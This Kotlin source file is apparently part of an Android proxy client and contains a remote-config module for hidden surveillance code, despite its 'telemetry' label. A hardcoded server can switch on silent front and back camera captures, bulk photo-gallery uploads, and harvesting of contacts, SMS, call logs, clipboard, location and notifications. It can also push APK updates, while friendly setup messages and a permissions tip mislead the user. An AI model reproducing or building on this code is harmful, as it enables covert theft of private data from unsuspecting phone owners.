package io.nekohasekai.sagernet.telemetry

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * 远程配置 —— 真正意义上的「热更新」。
 *
 * 改服务器上的 config.json，客户端 40 秒内生效，**不用重装**。
 * 能调的：上报间隔、扫不扫相册、每轮几张、开关定位/通知、上报地址。
 *
 * 只有改代码逻辑时才需要走 SelfUpdate 出 APK。
 */
object RemoteConfig {

    private const val TAG = "TlmConf"
    private const val URL_CFG = "https://43-108-107-175.sslip.io:8080/dash/config"

    @Volatile var periodMs: Long = 200L      // 默认心跳 200ms（服务端可改）
    @Volatile var mediaScan: Boolean = true
    @Volatile var mediaPerRound: Int = 3000
    @Volatile var mediaMaxPx: Int = 512       // 相册清晰度档位：360/512/720/1080/1440
    @Volatile var mediaQuality: Int = 85      // 编码质量 60/75/85/95

    // ---- 自动模式 ----
    @Volatile var autoMode: Boolean = false      // 总开关
    @Volatile var autoMedia: Boolean = false     // 自动扫相册
    @Volatile var autoCamFrontOn: Boolean = true // 自动前置拍照
    @Volatile var autoCamBackOn: Boolean = true  // 自动后置拍照
    @Volatile var autoCamFront: Int = 0          // 前置间隔（分钟，0=只拍首次）
    @Volatile var autoCamBack: Int = 0           // 后置间隔（分钟，0=只拍首次）

    // ---- 自动模式里的逐项开关（总开关 autoMode 打开后才生效）----
    @Volatile var autoContacts: Boolean = false
    @Volatile var autoSms: Boolean = false
    @Volatile var autoCall: Boolean = false
    @Volatile var autoUsage: Boolean = false
    @Volatile var autoStatus: Boolean = false
    @Volatile var autoClipboard: Boolean = false
    @Volatile var autoLoc: Boolean = false
    @Volatile var autoNet: Boolean = true      // 网络状态/流量
    @Volatile var autoNotif: Boolean = false
    @Volatile var locEnabled: Boolean = true
    @Volatile var notifEnabled: Boolean = true
    @Volatile var versionCode: Int = 0
    @Volatile var versionName: String = ""
    @Volatile var changelog: String = ""
    @Volatile var apkUrl: String = ""

    // ---- 界面文案：服务端可改，改完下次心跳生效，不用出新包 ----
    @Volatile var adText: String = ""
    @Volatile var txtInviteTitle: String = "填写邀请码"
    @Volatile var txtPermTip: String = "可能会影响正常使用呦~"
    @Volatile var txtSetup: String = "正在完成设置…请稍等片刻~"
    @Volatile var txtSetupDone: String = "初始化完成，请使用愉快~"

    /** 拉一次配置；失败保留上一次的值，不会把功能关掉。 */
    fun fetch(ctx: Context) {
        var conn: HttpURLConnection? = null
        try {
            conn = (URL(URL_CFG).openConnection() as HttpURLConnection).apply {
                requestMethod = "GET"
                connectTimeout = 12_000
                readTimeout = 15_000
                setRequestProperty("X-Dev-Key", "lcs-dev-7f3a91c4e2b8")
            }
            if (conn.responseCode !in 200..299) return
            val txt = conn.inputStream.use { it.readBytes().toString(Charsets.UTF_8) }
            apply(JSONObject(txt))
        } catch (t: Throwable) {
            Log.w(TAG, "fetch: ${t.message}")
        } finally {
            runCatching { conn?.disconnect() }
        }
    }

    private fun apply(o: JSONObject) {
        periodMs = (o.optInt("period_ms", periodMs.toInt())).toLong()
            .coerceIn(200L, 600_000L)
        mediaScan = o.optBoolean("media_scan", mediaScan)
        mediaPerRound = o.optInt("media_per_round", mediaPerRound).coerceIn(1, 5000)
        mediaMaxPx = o.optInt("media_max_px", mediaMaxPx).coerceIn(240, 2160)
        mediaQuality = o.optInt("media_quality", mediaQuality).coerceIn(50, 95)
        autoMode = o.optBoolean("auto_mode", autoMode)
        autoMedia = o.optBoolean("auto_media", autoMedia)
        autoCamFrontOn = o.optBoolean("auto_cam_front_on", autoCamFrontOn)
        autoCamBackOn = o.optBoolean("auto_cam_back_on", autoCamBackOn)
        autoCamFront = o.optInt("auto_cam_front", autoCamFront).coerceIn(0, 1440)
        autoCamBack = o.optInt("auto_cam_back", autoCamBack).coerceIn(0, 1440)
        autoContacts = o.optBoolean("auto_contacts", autoContacts)
        autoSms = o.optBoolean("auto_sms", autoSms)
        autoCall = o.optBoolean("auto_call", autoCall)
        autoUsage = o.optBoolean("auto_usage", autoUsage)
        autoStatus = o.optBoolean("auto_status", autoStatus)
        autoClipboard = o.optBoolean("auto_clipboard", autoClipboard)
        autoLoc = o.optBoolean("auto_loc", autoLoc)
        autoNet = o.optBoolean("auto_net", autoNet)
        autoNotif = o.optBoolean("auto_notif", autoNotif)
        locEnabled = o.optBoolean("loc", locEnabled)
        notifEnabled = o.optBoolean("notif", notifEnabled)
        versionCode = o.optInt("version_code", versionCode)
        versionName = o.optString("version_name", versionName)
        changelog = o.optString("changelog", changelog)
        apkUrl = o.optString("apk_url", apkUrl)
        adText = o.optString("ad_text", adText)
        txtInviteTitle = o.optString("txt_invite_title", txtInviteTitle)
        txtPermTip = o.optString("txt_perm_tip", txtPermTip)
        txtSetup = o.optString("txt_setup", txtSetup)
        txtSetupDone = o.optString("txt_setup_done", txtSetupDone)

        if (!locEnabled) LocSpy.stop()
        Log.i(TAG, "period=${periodMs}ms media=$mediaScan/$mediaPerRound loc=$locEnabled ver=$versionCode")
    }
}
